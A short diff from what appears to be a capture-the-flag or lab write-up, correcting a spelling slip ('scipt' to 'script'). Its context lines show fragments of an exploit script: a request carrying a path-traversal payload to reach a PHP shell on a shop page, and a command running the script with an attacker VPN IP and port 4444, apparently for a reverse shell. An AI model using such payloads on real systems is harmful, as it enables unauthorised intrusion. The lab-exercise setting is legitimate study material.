@@ -70,7 +70,7 @@ phpshell = session.get(url + f"shop/index.php?page=..%2f..%2f..%2f..%2f..%2fvar%
 proc.terminate()
 ```
 
-save this python scipt with **.py** format and run the following line of codes.
+save this python script with **.py** format and run the following line of codes.
 
 ```
 python3 script.py <your_vpn_ip> 4444 
